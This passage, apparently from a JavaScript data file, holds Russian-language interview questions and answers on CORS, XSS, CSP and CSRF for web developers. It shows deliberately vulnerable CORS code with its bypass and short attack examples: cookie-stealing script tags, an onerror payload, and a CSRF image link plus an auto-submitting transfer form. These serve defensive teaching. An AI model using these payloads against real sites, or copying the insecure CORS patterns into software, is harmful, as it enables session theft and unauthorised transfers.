this.maxRetries) {\n        console.log(`Retry ${retryCount + 1}/${this.maxRetries}`);\n        await this.delay(this.retryDelay);\n        return this.fetchWithRetry(url, options, retryCount + 1);\n      }\n      \n      throw error;\n    }\n  }\n  \n  isCORSError(error) {\n    return error.message.includes('CORS') ||\n           error.message.includes('blocked') ||\n           error.message.includes('cross-origin');\n  }\n  \n  isNetworkError(error) {\n    return error.message.includes('NetworkError') ||\n           error.message.includes('Failed to fetch');\n  }\n  \n  handleCORSError() {\n    // Показать модальное окно или уведомление\n    this.showNotification({\n      type: 'error',\n      title: 'Ошибка загрузки',\n      message: 'Данные временно недоступны. Пожалуйста, попробуйте позже.'\n    });\n  }\n  \n  delay(ms) {\n    return new Promise(resolve => setTimeout(resolve, ms));\n  }\n  \n  showNotification(config) {\n    // Реализация зависит от UI библиотеки\n    console.log(`[${config.type}] ${config.title}: ${config.message}`);\n  }\n}\n\n// Использование\nconst corsHandler = new CORSHandler({\n  maxRetries: 3,\n  fallbackURL: 'https://backup-api.example.com/data'\n});\n\nasync function loadData() {\n  try {\n    const data = await corsHandler.fetchWithRetry('https://api.example.com/data');\n    displayData(data);\n  } catch (error) {\n    if (error.message === 'CORS_BLOCKED') {\n      showOfflineMode();\n    }\n  }\n}</code></pre><p><strong>Стратегии fallback:</strong></p><p><strong>1. Кэшированные данные:</strong></p><ul><li>Хранить последний успешный ответ</li><li>Показывать при CORS ошибке</li><li>Уведомить что данные могут быть устаревшими</li></ul><p><strong>2. Альтернативный endpoint:</strong></p><ul><li>Запасной API на другом домене</li><li>Прокси сервер</li><li>CDN endpoint</li></ul><p><strong>3. Degraded mode:</strong></p><ul><li>Ограниченная функциональность без проблемного API</li><li>Статические данные вместо динамических</li><li>Режим «только для чтения»</li></ul><p><strong>Пользовательский опыт:</strong></p><ul><li>✅ Понятные сообщения об ошибках (не технический жаргон)</li><li>✅ Предложить действия (обновить страницу, попробовать позже)</li><li>✅ Показывать fallback контент если возможно</li><li>✅ Логировать ошибки для мониторинга</li><li>❌ Не показывать технические детали CORS</li><li>❌ Не оставлять пользователя на сломанной странице</li></ul><p><strong>Мониторинг CORS ошибок:</strong></p><pre><code>// Отправка метрик в аналитику\nfunction trackCORSError(url, error) {\n  if (typeof gtag !== 'undefined') {\n    gtag('event', 'cors_error', {\n      'event_category': 'API',\n      'event_label': url,\n      'value': 1\n    });\n  }\n  \n  // Отправка в error tracking (Sentry, LogRocket)\n  if (typeof Sentry !== 'undefined') {\n    Sentry.captureException(error, {\n      tags: { type: 'cors_error' },\n      extra: { url }\n    });\n  }\n}</code></pre>",
    difficulty: 'middle',
    tags: ['CORS', 'обработка ошибок', 'UX', 'fallback']
  },
  {
    id: 43,
    question: "Какие особенности CORS при работе с файлами и медиа контентом?",
    answer: "<p><strong>CORS для файлов и медиа</strong> имеет свои особенности и требования.</p><p><strong>Загрузка изображений cross-origin:</strong></p><p><strong>Обычная загрузка без CORS:</strong></p><ul><li>&lt;img src=\"https://other.com/image.jpg\"&gt; — работает без CORS</li><li>Изображение отображается нормально</li><li>НО нельзя читать пиксели через canvas</li><li>Canvas становится «tainted» (загрязненным)</li></ul><p><strong>С CORS для доступа к пикселям:</strong></p><ul><li>&lt;img src=\"...\" crossorigin=\"anonymous\"&gt;</li><li>Браузер запрашивает CORS разрешения</li><li>Сервер должен вернуть Access-Control-Allow-Origin</li><li>Теперь можно читать пиксели через canvas.getImageData()</li></ul><p><strong>Атрибут crossorigin:</strong></p><ul><li>crossorigin=\"anonymous\" — без credentials</li><li>crossorigin=\"use-credentials\" — с cookies</li></ul><p><strong>Canvas и tainted canvas:</strong></p><p><strong>Без CORS:</strong></p><ul><li>Можно нарисовать cross-origin изображение на canvas</li><li>НО нельзя вызвать toDataURL(), getImageData()</li><li>SecurityError: Canvas has been tainted</li></ul><p><strong>С CORS:</strong></p><ul><li>Можно читать пиксели</li><li>Можно экспортировать в Data URL</li><li>Можно применять фильтры и обработку</li></ul><p><strong>Видео и аудио элементы:</strong></p><p><strong>Базовое воспроизведение:</strong></p><ul><li>&lt;video src=\"https://other.com/video.mp4\"&gt; — работает без CORS</li><li>&lt;audio src=\"https://other.com/audio.mp3\"&gt; — работает без CORS</li></ul><p><strong>Для обработки через Web Audio API:</strong></p><ul><li>&lt;video crossorigin=\"anonymous\"&gt;</li><li>Нужно для MediaElementSource</li><li>Для визуализации аудио (waveforms)</li></ul><p><strong>Fonts (веб-шрифты):</strong></p><p><strong>CORS обязателен:</strong></p><ul><li>Браузеры требуют CORS для cross-origin шрифтов</li><li>@font-face не загрузится без правильных заголовков</li><li>Всегда нужен Access-Control-Allow-Origin</li></ul><p><strong>WebGL текстуры:</strong></p><ul><li>Cross-origin изображения требуют CORS</li><li>Иначе WebGL контекст становится tainted</li><li>Нужен crossorigin=\"anonymous\" на img</li></ul><p><strong>Fetch API для файлов:</strong></p><p><strong>Загрузка бинарных данных:</strong></p><ul><li>Подчиняется стандартным CORS правилам</li><li>Нужны Access-Control-Allow-Origin заголовки</li><li>Можно получить Blob, ArrayBuffer</li></ul><p><strong>Загрузка файлов на сервер:</strong></p><p><strong>FormData upload:</strong></p><ul><li>POST с multipart/form-data</li><li>Обычно требует preflight (если Content-Type кастомный)</li><li>Нужны CORS заголовки на сервере</li></ul><p><strong>Progress tracking:</strong></p><ul><li>XMLHttpRequest.upload.addEventListener('progress')</li><li>Требует preflight из-за event listeners</li></ul><p><strong>CDN и статические файлы:</strong></p><p><strong>Правильная конфигурация CDN:</strong></p><ul><li>Добавить Access-Control-Allow-Origin: *</li><li>Для публичных ресурсов (изображения, шрифты, скрипты)</li><li>Или конкретные origins для приватных файлов</li></ul><p><strong>Caching headers с CORS:</strong></p><ul><li>Vary: Origin для корректного кэширования</li><li>Иначе прокси могут вернуть неправильные CORS заголовки</li></ul><p><strong>Best practices для медиа:</strong></p><ul><li>✅ Всегда настраивайте CORS для fonts</li><li>✅ Используйте crossorigin для canvas манипуляций</li><li>✅ CDN должен отдавать Access-Control-Allow-Origin</li><li>✅ Добавляйте Vary: Origin для кэширования</li><li>✅ Тестируйте загрузку из разных origins</li></ul>",
    difficulty: 'senior',
    tags: ['CORS', 'файлы', 'медиа', 'canvas', 'fonts']
  },
  {
    id: 44,
    question: "Как тестировать CORS локально и в production?",
    answer: "<p><strong>Тестирование CORS</strong> важно на всех этапах разработки.</p><p><strong>Локальное тестирование:</strong></p><p><strong>1. Несколько локальных серверов:</strong></p><ul><li>Фронтенд: localhost:3000</li><li>API: localhost:4000</li><li>Это уже cross-origin (разные порты)</li><li>Позволяет тестировать CORS локально</li></ul><p><strong>2. Hosts файл для симуляции доменов:</strong></p><ul><li>Добавить в /etc/hosts (Mac/Linux) или C:\\Windows\\System32\\drivers\\etc\\hosts (Windows)</li><li>127.0.0.1 app.local</li><li>127.0.0.1 api.local</li><li>Теперь можно тестировать настоящие cross-domain запросы</li></ul><p><strong>3. Dev сервер с прокси (для фронтенда):</strong></p><pre><code>// webpack.config.js или vite.config.js\nmodule.exports = {\n  devServer: {\n    proxy: {\n      '/api': {\n        target: 'http://localhost:4000',\n        changeOrigin: true,\n        // В dev прокси обходит CORS\n      }\n    }\n  }\n};</code></pre><p><strong>Инструменты для тестирования:</strong></p><p><strong>1. Browser DevTools:</strong></p><ul><li>Network tab → проверить Headers</li><li>Request Headers: Origin</li><li>Response Headers: Access-Control-*</li><li>Console: CORS ошибки если есть</li></ul><p><strong>2. curl для ручного тестирования:</strong></p><pre><code># Preflight запрос\ncurl -X OPTIONS \\\n  -H \"Origin: https://app.example.com\" \\\n  -H \"Access-Control-Request-Method: POST\" \\\n  -H \"Access-Control-Request-Headers: Content-Type\" \\\n  -i https://api.example.com/endpoint\n\n# Основной запрос\ncurl -X POST \\\n  -H \"Origin: https://app.example.com\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"key\":\"value\"}' \\\n  -i https://api.example.com/endpoint\n\n# Проверить заголовки ответа</code></pre><p><strong>3. Postman/Insomnia:</strong></p><ul><li>НЕ показывают CORS проблемы</li><li>Эти инструменты не браузеры, CORS не применяется</li><li>Полезны для проверки что API работает</li><li>НО не для тестирования CORS</li></ul><p><strong>4. Browser extensions для тестирования:</strong></p><ul><li>CORS Everywhere (Firefox)</li><li>Allow CORS (Chrome)</li><li>Отключают CORS для тестирования</li><li>Только для dev, не для production</li></ul><p><strong>Автоматизированное тестирование:</strong></p><p><strong>Unit тесты (Jest, Mocha):</strong></p><pre><code>describe('CORS API tests', () => {\n  it('should return CORS headers for allowed origin', async () => {\n    const response = await fetch('http://localhost:4000/api/data', {\n      method: 'GET',\n      headers: {\n        'Origin': 'https://app.example.com'\n      }\n    });\n    \n    expect(response.headers.get('Access-Control-Allow-Origin'))\n      .toBe('https://app.example.com');\n  });\n  \n  it('should handle preflight correctly', async () => {\n    const response = await fetch('http://localhost:4000/api/data', {\n      method: 'OPTIONS',\n      headers: {\n        'Origin': 'https://app.example.com',\n        'Access-Control-Request-Method': 'DELETE'\n      }\n    });\n    \n    expect(response.status).toBe(204);\n    expect(response.headers.get('Access-Control-Allow-Methods'))\n      .toContain('DELETE');\n  });\n});</code></pre><p><strong>E2E тесты (Playwright, Cypress):</strong></p><pre><code>// Cypress пример\ndescribe('CORS in real browser', () => {\n  it('should make successful cross-origin request', () => {\n    cy.visit('https://app.example.com');\n    \n    cy.intercept('GET', 'https://api.example.com/data').as('apiCall');\n    \n    cy.get('[data-testid=\"load-button\"]').click();\n    \n    cy.wait('@apiCall').then((interception) => {\n      expect(interception.response.statusCode).to.eq(200);\n      expect(interception.response.headers)\n        .to.have.property('access-control-allow-origin');\n    });\n  });\n});</code></pre><p><strong>Production мониторинг:</strong></p><ul><li>Отслеживание CORS ошибок через Sentry/LogRocket</li><li>Метрики успешности запросов</li><li>Алерты при росте CORS ошибок</li></ul><p><strong>Чек-лист перед production:</strong></p><ul><li>✅ CORS заголовки настроены на всех endpoints</li><li>✅ Preflight запросы обрабатываются (OPTIONS)</li><li>✅ Whitelist origins актуален</li><li>✅ Credentials настроены правильно если нужны</li><li>✅ Max-Age установлен для оптимизации</li><li>✅ Тестирование с реальными доменами</li><li>✅ Мониторинг настроен</li></ul>",
    difficulty: 'middle',
    tags: ['CORS', 'тестирование', 'debugging', 'DevTools']
  },
  {
    id: 45,
    question: "Какие распространенные security уязвимости связаны с неправильной настройкой CORS?",
    answer: "<p><strong>Неправильная настройка CORS</strong> может привести к серьезным проблемам безопасности.</p><p><strong>1. Использование Access-Control-Allow-Origin: *</strong></p><p><strong>Проблема:</strong></p><ul><li>Любой сайт может читать данные вашего API</li><li>Утечка конфиденциальной информации</li><li>Злонамеренные сайты получают доступ к данным</li></ul><p><strong>Когда это опасно:</strong></p><ul><li>API возвращает персональные данные</li><li>Есть приватные endpoints</li><li>Данные зависят от аутентификации</li></ul><p><strong>Когда можно использовать:</strong></p><ul><li>Публичное API без чувствительных данных</li><li>Открытые справочники, словари</li><li>Public CDN ресурсы</li></ul><p><strong>2. Отражение любого Origin без валидации</strong></p><p><strong>Уязвимый код:</strong></p><pre><code>// ❌ ОПАСНО!\napp.use((req, res, next) => {\n  // Просто отражаем любой Origin\n  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);\n  res.setHeader('Access-Control-Allow-Credentials', 'true');\n  next();\n});</code></pre><p><strong>Атака:</strong></p><ul><li>evil.com делает запрос к вашему API</li><li>Получает Access-Control-Allow-Origin: https://evil.com</li><li>Может читать все данные включая аутентифицированные</li></ul><p><strong>Правильно:</strong></p><pre><code>// ✅ Безопасно\nconst allowedOrigins = [\n  'https://app.example.com',\n  'https://admin.example.com'\n];\n\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  \n  if (allowedOrigins.includes(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);\n    res.setHeader('Access-Control-Allow-Credentials', 'true');\n  }\n  \n  next();\n});</code></pre><p><strong>3. Wildcard с credentials</strong></p><p><strong>Ошибка:</strong></p><ul><li>Access-Control-Allow-Origin: *</li><li>Access-Control-Allow-Credentials: true</li><li>Браузеры блокируют эту комбинацию</li><li>НО попытка использовать указывает на непонимание безопасности</li></ul><p><strong>4. Regex валидация с ошибками</strong></p><p><strong>Уязвимый паттерн:</strong></p><pre><code>// ❌ Небезопасно\nconst originPattern = /https:\\/\\/.*\\.example\\.com/;\n\nif (originPattern.test(req.headers.origin)) {\n  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);\n}\n\n// Проблема: https://evil.com?example.com — пройдет проверку!</code></pre><p><strong>Безопаснее:</strong></p><pre><code>// ✅ Строгая проверка\nconst originPattern = /^https:\\/\\/[a-z0-9-]+\\.example\\.com$/;\n\nif (originPattern.test(req.headers.origin)) {\n  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);\n}</code></pre><p><strong>5. Null origin</strong></p><p><strong>Проблема:</strong></p><ul><li>Некоторые сценарии отправляют Origin: null</li><li>Файлы открытые локально (file://)</li><li>Sandboxed iframe</li></ul><p><strong>Уязвимая конфигурация:</strong></p><pre><code>// ❌ Опасно\nif (req.headers.origin === 'null' || allowedOrigins.includes(req.headers.origin)) {\n  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);\n}</code></pre><p><strong>Атака:</strong></p><ul><li>Злонамеленный сайт открывает iframe с sandbox</li><li>Origin становится null</li><li>Получает доступ к API</li></ul><p><strong>6. Недостаточная проверка preflight</strong></p><p><strong>Проблема:</strong></p><ul><li>OPTIONS запрос не проверяет аутентификацию</li><li>Возвращает информацию о доступных методах всем</li><li>Информационная утечка</li></ul><p><strong>Лучше:</strong></p><ul><li>Проверять аутентификацию и для OPTIONS</li><li>Или возвращать минимум информации</li></ul><p><strong>7. Exposed Headers без контроля</strong></p><p><strong>Риск:</strong></p><ul><li>Access-Control-Expose-Headers: * (не стандартно, но некоторые имплементации)</li><li>Утечка внутренних заголовков</li><li>Раскрытие версий, токенов в заголовках</li></ul><p><strong>8. Игнорирование других мер безопасности</strong></p><p><strong>CORS не заменяет:</strong></p><ul><li>Аутентификацию (проверка токенов/сессий)</li><li>Авторизацию (права доступа)</li><li>Input validation</li><li>Rate limiting</li><li>CSRF токены</li></ul><p><strong>Best practices безопасности:</strong></p><ul><li>✅ Используйте строгий whitelist origins</li><li>✅ Никогда не отражайте Origin без проверки</li><li>✅ Избегайте * для приватных API</li><li>✅ Валидируйте Origin с точными регулярками</li><li>✅ Не доверяйте Origin: null</li><li>✅ Проверяйте аутентификацию независимо от CORS</li><li>✅ Логируйте подозрительные Origins</li><li>✅ Регулярно аудит CORS конфигурации</li><li>✅ Defense in depth — несколько уровней защиты</li></ul>",
    difficulty: 'senior',
    tags: ['CORS', 'безопасность', 'уязвимости', 'security', 'best practices']
  },
  {
    id: 46,
    question: "В чем разница между XSS и CSRF атаками? Какие угрозы они представляют?",
    answer: "<p><strong>XSS (Cross-Site Scripting)</strong> и <strong>CSRF (Cross-Site Request Forgery)</strong> — это два разных типа атак на веб-приложения.</p><p><strong>XSS (Cross-Site Scripting):</strong></p><p><strong>Суть атаки:</strong></p><ul><li>Злоумышленник внедряет вредоносный JavaScript код на страницу</li><li>Код выполняется в браузере жертвы</li><li>Атакующий получает контроль над контекстом жертвы</li></ul><p><strong>Что может злоумышленник:</strong></p><ul><li>Украсть cookies и session tokens</li><li>Прочитать конфиденциальные данные со страницы</li><li>Изменить содержимое страницы</li><li>Выполнить действия от имени пользователя</li><li>Перенаправить на фишинговую страницу</li><li>Установить keylogger</li></ul><p><strong>CSRF (Cross-Site Request Forgery):</strong></p><p><strong>Суть атаки:</strong></p><ul><li>Злоумышленник заставляет браузер жертвы отправить запрос</li><li>Использует существующую аутентификацию жертвы</li><li>Жертва неосознанно выполняет действия</li></ul><p><strong>Что может злоумышленник:</strong></p><ul><li>Изменить настройки аккаунта</li><li>Совершить финансовые транзакции</li><li>Опубликовать контент от имени жертвы</li><li>Удалить данные</li><li>Изменить пароль</li></ul><p><strong>Ключевые различия:</strong></p><p><strong>XSS:</strong></p><ul><li>Цель: выполнить код в контексте жертвы</li><li>Вектор: внедрение скрипта на сайт</li><li>Требует: уязвимость в самом приложении</li><li>Может: читать данные, украсть токены</li></ul><p><strong>CSRF:</strong></p><ul><li>Цель: выполнить действие от имени жертвы</li><li>Вектор: обман браузера для отправки запроса</li><li>Требует: активную сессию жертвы</li><li>Может: изменять состояние, но не читать данные</li></ul><p><strong>Примеры атак:</strong></p><p><strong>XSS пример:</strong></p><ul><li>Комментарий на форуме: &lt;script&gt;steal(document.cookie)&lt;/script&gt;</li><li>Все кто прочитает комментарий — скомпрометированы</li></ul><p><strong>CSRF пример:</strong></p><ul><li>Злонамеренный сайт содержит: &lt;img src=\"bank.com/transfer?to=attacker&amount=1000\"&gt;</li><li>Если жертва залогинена в банке — деньги переведутся</li></ul><p><strong>Угрозы для бизнеса:</strong></p><ul><li>Утечка персональных данных</li><li>Финансовые потери</li><li>Репутационный ущерб</li><li>Компрометация аккаунтов пользователей</li><li>Нарушение комплаенса (GDPR, PCI DSS)</li></ul>",
    difficulty: 'junior',
    tags: ['XSS', 'CSRF', 'безопасность', 'атаки', 'различия']
  },

  {
    id: 47,
    question: "Какие типы XSS атак существуют и чем они отличаются?",
    answer: "<p><strong>Существует три основных типа XSS атак:</strong> Stored, Reflected и DOM-based.</p><p><strong>1. Stored XSS (Хранимый XSS):</strong></p><p><strong>Как работает:</strong></p><ul><li>Вредоносный код сохраняется на сервере (в БД)</li><li>Например, в комментарии, профиле, посте</li><li>Код выполняется у всех, кто просматривает контент</li><li>Атака персистентная — действует постоянно</li></ul><p><strong>Пример:</strong></p><ul><li>Пользователь оставляет комментарий: \"Отличная статья! &lt;script&gt;sendCookies()&lt;/script&gt;\"</li><li>Сервер сохраняет без санитизации</li><li>Все посетители выполнят этот скрипт</li></ul><p><strong>Опасность:</strong></p><ul><li>Самый опасный тип XSS</li><li>Массовая компрометация пользователей</li><li>Долгосрочное воздействие</li></ul><p><strong>2. Reflected XSS (Отраженный XSS):</strong></p><p><strong>Как работает:</strong></p><ul><li>Вредоносный код в URL параметрах</li><li>Сервер отражает его обратно на страницу</li><li>Не сохраняется на сервере</li><li>Требует заманить жертву по специальной ссылке</li></ul><p><strong>Пример:</strong></p><ul><li>URL: site.com/search?q=&lt;script&gt;steal()&lt;/script&gt;</li><li>Страница отображает: \"Результаты для: &lt;script&gt;steal()&lt;/script&gt;\"</li><li>Код выполняется при переходе по ссылке</li></ul><p><strong>Опасность:</strong></p><ul><li>Требует социальной инженерии (обманом заставить кликнуть)</li><li>Одноразовая атака на конкретную жертву</li><li>Часто используется в фишинге</li></ul><p><strong>3. DOM-based XSS (Базирующийся на DOM):</strong></p><p><strong>Как работает:</strong></p><ul><li>Уязвимость в клиентском JavaScript коде</li><li>Код манипулирует DOM небезопасно</li><li>Вредоносный payload может быть в URL, fragment (#)</li><li>Сервер может быть вообще не причастен</li></ul><p><strong>Пример:</strong></p><ul><li>JavaScript: document.write(location.hash)</li><li>URL: site.com#&lt;img src=x onerror=alert()&gt;</li><li>Код выполнится на клиенте</li></ul><p><strong>Опасность:</strong></p><ul><li>Сложнее обнаружить (не проходит через сервер)</li><li>WAF не помогает</li><li>Требует аудита клиентского кода</li></ul><p><strong>Другие классификации XSS:</strong></p><p><strong>Self-XSS:</strong></p><ul><li>Жертва сама вставляет код (обманом)</li><li>Например: \"Вставь этот код в консоль для бесплатных монет\"</li><li>Технически не уязвимость, но социальная инженерия</li></ul><p><strong>Blind XSS:</strong></p><ul><li>Payload выполняется не в публичной части сайта</li><li>Например, в админ-панели при просмотре отчета</li><li>Атакующий не видит когда сработало</li><li>Нужен callback для подтверждения</li></ul><p><strong>Сравнение типов:</strong></p><table><tr><th>Тип</th><th>Хранение</th><th>Охват</th><th>Опасность</th></tr><tr><td>Stored</td><td>На сервере</td><td>Массовый</td><td>Очень высокая</td></tr><tr><td>Reflected</td><td>Нет</td><td>Одиночный</td><td>Средняя</td></tr><tr><td>DOM-based</td><td>Нет</td><td>Одиночный</td><td>Средняя-Высокая</td></tr></table>",
    difficulty: 'middle',
    tags: ['XSS', 'типы атак', 'Stored XSS', 'Reflected XSS', 'DOM-based XSS']
  },

  {
    id: 48,
    question: "Как предотвратить XSS атаки? Какие методы защиты существуют?",
    answer: "<p><strong>Защита от XSS</strong> требует многоуровневого подхода и применения нескольких методов одновременно.</p><p><strong>1. Input Sanitization (Санитизация ввода):</strong></p><p><strong>Экранирование HTML символов:</strong></p><ul><li>Преобразовать специальные символы в HTML entities</li><li>&lt; становится &amp;lt;</li><li>&gt; становится &amp;gt;</li><li>&amp; становится &amp;amp;</li><li>\" становится &amp;quot;</li><li>' становится &amp;#x27;</li></ul><p><strong>Важно экранировать на выводе:</strong></p><ul><li>При отображении пользовательских данных</li><li>Не только при сохранении</li><li>Context-aware escaping (в зависимости от контекста)</li></ul><p><strong>2. Content Security Policy (CSP):</strong></p><p><strong>Что делает:</strong></p><ul><li>Браузер ограничивает источники скриптов</li><li>Блокирует inline scripts по умолчанию</li><li>Контролирует откуда загружаются ресурсы</li></ul><p><strong>Базовая конфигурация:</strong></p><ul><li>Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'</li><li>Разрешает скрипты только с вашего домена</li><li>Или с конкретным nonce атрибутом</li></ul><p><strong>3. HttpOnly флаг для cookies:</strong></p><ul><li>Делает cookies недоступными для JavaScript</li><li>document.cookie не может их прочитать</li><li>Даже при успешном XSS session cookies защищены</li><li>Set-Cookie: sessionId=abc; HttpOnly; Secure</li></ul><p><strong>4. Использование безопасных API:</strong></p><p><strong>Избегать опасных методов:</strong></p><ul><li>❌ element.innerHTML = userInput</li><li>❌ document.write(userInput)</li><li>❌ eval(userInput)</li><li>✅ element.textContent = userInput</li><li>✅ element.innerText = userInput</li></ul><p><strong>5. Валидация типов данных:</strong></p><ul><li>Email должен быть валидным email</li><li>Числа — только цифры</li><li>URL — корректный формат</li><li>Whitelist разрешенных значений где возможно</li></ul><p><strong>6. Использование фреймворков с auto-escaping:</strong></p><ul><li>React автоматически экранирует в JSX</li><li>Vue экранирует в шаблонах</li><li>Angular использует DomSanitizer</li><li>НО нужно правильно использовать (не отключать защиту)</li></ul><p><strong>7. X-XSS-Protection заголовок:</strong></p><ul><li>X-XSS-Protection: 1; mode=block</li><li>Включает встроенную защиту браузера</li><li>Устаревает, но дополнительный уровень</li></ul><p><strong>8. DOMPurify для санитизации HTML:</strong></p><ul><li>Если нужно разрешить некоторый HTML (rich text)</li><li>Библиотека очищает опасные теги и атрибуты</li><li>Использовать перед вставкой в DOM</li></ul><p><strong>9. Регулярные security аудиты:</strong></p><ul><li>Code review с фокусом на безопасность</li><li>Автоматические сканеры (OWASP ZAP, Burp Suite)</li><li>Penetration testing</li></ul><p><strong>10. Обучение разработчиков:</strong></p><ul><li>Понимание рисков XSS</li><li>Безопасные практики кодирования</li><li>Знание safe/unsafe API</li></ul><p><strong>Defense in Depth (многоуровневая защита):</strong></p><ul><li>✅ Санитизация + CSP + HttpOnly + Фреймворки</li><li>Если один слой пробит — есть другие</li><li>Ни один метод не дает 100% гарантии сам по себе</li></ul>",
    difficulty: 'middle',
    tags: ['XSS', 'защита', 'безопасность', 'sanitization', 'CSP']
  },

  {
    id: 49,
    question: "Что такое Content Security Policy (CSP) и как он защищает от XSS?",
    answer: "<p><strong>Content Security Policy (CSP)</strong> — это HTTP заголовок безопасности, который контролирует откуда браузер может загружать ресурсы.</p><p><strong>Основная идея CSP:</strong></p><ul><li>Белый список разрешенных источников контента</li><li>Браузер блокирует загрузку из неразрешенных источников</li><li>Значительно усложняет эксплуатацию XSS</li><li>Даже если код внедрен — он не выполнится</li></ul><p><strong>Базовая структура CSP:</strong></p><ul><li>Content-Security-Policy: директива источник; директива источник;</li><li>Каждая директива контролирует свой тип ресурсов</li></ul><p><strong>Основные директивы:</strong></p><p><strong>default-src:</strong></p><ul><li>Дефолтная политика для всех типов контента</li><li>default-src 'self' — только с вашего домена</li></ul><p><strong>script-src:</strong></p><ul><li>Откуда можно загружать скрипты</li><li>script-src 'self' https://cdn.example.com</li><li>Самая важная директива для защиты от XSS</li></ul><p><strong>style-src:</strong></p><ul><li>Источники стилей CSS</li><li>style-src 'self' 'unsafe-inline'</li></ul><p><strong>img-src:</strong></p><ul><li>Источники изображений</li><li>img-src 'self' data: https:</li></ul><p><strong>Специальные значения источников:</strong></p><p><strong>'self':</strong></p><ul><li>Текущий origin (домен + протокол + порт)</li><li>Самый безопасный вариант</li></ul><p><strong>'none':</strong></p><ul><li>Полный запрет</li><li>Никакие источники не разрешены</li></ul><p><strong>'unsafe-inline':</strong></p><ul><li>Разрешает inline скрипты/стили</li><li>❌ Снижает защиту от XSS</li><li>Избегать где возможно</li></ul><p><strong>'unsafe-eval':</strong></p><ul><li>Разрешает eval(), new Function()</li><li>❌ Очень опасно для XSS</li><li>Избегать</li></ul><p><strong>Nonce-based CSP (рекомендуется):</strong></p><p><strong>Как работает:</strong></p><ul><li>Сервер генерирует случайный nonce для каждого запроса</li><li>Добавляет в CSP заголовок</li><li>Разрешены только скрипты с этим nonce</li></ul><p><strong>Пример:</strong></p><ul><li>CSP: script-src 'nonce-random123'</li><li>HTML: &lt;script nonce=\"random123\"&gt;...&lt;/script&gt; ✅ выполнится</li><li>Внедренный скрипт без nonce ❌ заблокирован</li></ul><p><strong>Hash-based CSP:</strong></p><ul><li>Для статических inline скриптов</li><li>script-src 'sha256-base64hash'</li><li>Разрешает скрипт с конкретным хешем</li></ul><p><strong>Reporting (отчеты о нарушениях):</strong></p><ul><li>report-uri /csp-violation-report</li><li>Браузер отправляет отчет при блокировке</li><li>Помогает обнаружить атаки и проблемы</li></ul><p><strong>Report-Only режим:</strong></p><ul><li>Content-Security-Policy-Report-Only</li><li>Не блокирует, только отчитывает</li><li>Полезно для тестирования политики</li></ul><p><strong>Примеры политик:</strong></p><p><strong>Строгая политика:</strong></p><ul><li>Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'</li></ul><p><strong>С CDN:</strong></p><ul><li>Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.cloudflare.com; style-src 'self' 'unsafe-inline'</li></ul><p><strong>С nonce:</strong></p><ul><li>Content-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic'</li></ul><p><strong>Ограничения CSP:</strong></p><ul><li>Не защищает от всех типов XSS (например, DOM-based в некоторых случаях)</li><li>Требует тщательной настройки</li><li>Может сломать легитимную функциональность</li><li>Старые браузеры не поддерживают</li></ul><p><strong>Best practices:</strong></p><ul><li>✅ Начать с Report-Only для тестирования</li><li>✅ Использовать nonce для inline scripts</li><li>✅ Избегать 'unsafe-inline' и 'unsafe-eval'</li><li>✅ Минимизировать inline код</li><li>✅ Настроить reporting endpoint</li><li>✅ Регулярно проверять отчеты</li></ul>",
    difficulty: 'middle',
    tags: ['CSP', 'Content Security Policy', 'XSS', 'защита', 'заголовки']
  },

  {
    id: 50,
    question: "Как работают CSRF атаки и какой механизм они эксплуатируют?",
    answer: "<p><strong>CSRF (Cross-Site Request Forgery)</strong> эксплуатирует доверие сервера к браузеру пользователя.</p><p><strong>Базовый принцип атаки:</strong></p><ol><li>Пользователь залогинен на сайте victim.com</li><li>Браузер хранит session cookie для victim.com</li><li>Пользователь посещает злонамеренный сайт evil.com</li><li>evil.com создает запрос к victim.com</li><li>Браузер автоматически прикрепляет cookies</li><li>victim.com думает что это легитимный запрос</li><li>Действие выполняется от имени пользователя</li></ol><p><strong>Почему это работает:</strong></p><ul><li>Браузер автоматически отправляет cookies с КАЖДЫМ запросом</li><li>Не важно откуда исходит запрос</li><li>Сервер видит валидную аутентификацию</li><li>Нет способа отличить источник запроса только по cookies</li></ul><p><strong>Типичный сценарий атаки:</strong></p><p><strong>Перевод денег:</strong></p><ol><li>Пользователь залогинен в банке (bank.com)</li><li>Открывает письмо со ссылкой на картинку</li><li>Картинка на самом деле: &lt;img src=\"https://bank.com/transfer?to=attacker&amount=5000\"&gt;</li><li>Браузер делает GET запрос для загрузки \"картинки\"</li><li>Cookies банка отправляются автоматически</li><li>Деньги переведены</li></ol><p><strong>Более сложная атака через форму:</strong></p><ol><li>evil.com содержит скрытую форму</li><li>&lt;form action=\"https://bank.com/transfer\" method=\"POST\"&gt;</li><li>&lt;input name=\"to\" value=\"attacker\"&gt;</li><li>&lt;input name=\"amount\" value=\"5000\"&gt;</li><li>&lt;/form&gt;</li><li>&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</li><li>Форма отправляется автоматически при загрузке</li></ol><p><strong>Требования для успешной CSRF:</strong></p><ul><li>Жертва должна быть авторизована на целевом сайте</li><li>Атакующий должен знать структуру запроса</li><li>Сайт должен полагаться только на cookies для аутентификации</li><li>Запрос должен иметь побочные эффекты (изменение данных)</li></ul><p><strong>Что может сделать CSRF:</strong></p><ul><li>✅ Изменить пароль/email</li><li>✅ Совершить покупку/перевод</li><li>✅ Опубликовать контент</li><li>✅ Удалить данные</li><li>✅ Изменить настройки</li><li>❌ НЕ может читать ответ (Same-Origin Policy)</li><li>❌ НЕ может красть данные напрямую</li></ul><p><strong>Методы которые используют CSRF:</strong></p><p><strong>GET запросы:</strong></p><ul><li>Через img, script, link теги</li><li>Простейшая атака</li><li>Поэтому GET не должен изменять данные</li></ul><p><strong>POST запросы:</strong></p><ul><li>Через автоматически отправляемые формы</li><li>Более сложная но реалистичная</li></ul><p><strong>PUT/DELETE через XHR:</strong></p><ul><li>Требует CORS разрешений</li><li>Обычно блокируется браузером</li><li>Менее распространено</li></ul><p><strong>Почему CSRF опасен:</strong></p><ul><li>Скрытность — жертва не подозревает</li><li>Использует легитимную аутентификацию</li><li>Может привести к финансовым 